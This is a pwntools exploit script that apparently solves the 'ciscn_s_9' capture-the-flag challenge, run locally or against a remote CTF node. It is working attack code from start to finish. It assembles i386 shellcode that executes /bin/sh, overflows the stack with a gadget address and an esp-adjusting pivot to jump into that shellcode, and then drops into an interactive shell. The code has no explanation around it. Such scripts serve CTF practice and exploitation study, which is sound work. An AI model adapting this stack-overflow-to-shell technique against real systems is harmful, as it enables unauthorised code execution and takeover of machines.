import sys
from pwn import *
context.log_level='debug'
context.arch='i386'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./ciscn_s_9')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./ciscn_s_9')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',28866)
			elf=ELF('./ciscn_s_9')
			libc=ELF('../../x64libc/libc.so.6')

		
		
		io.recv()
		#gdb.attach(io,'b *0x08048526')
		#pause()
		shell='''
		push 0x68732f
		push 0x6e69622f
		mov ebx, esp
		xor ecx,ecx
		xor edx,edx
		push 11
		pop eax
		int 0x80
		'''


		pay=p32(0x08048554)+asm(shell)
		pay=pay.ljust(0x24,'a')+p32(0x08048554)+asm("sub esp,0x28;ret")
		
		io.sendline(pay)

		#success('libc_base:'+hex(libc_base))
		#gdb.attach(io)
		#pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue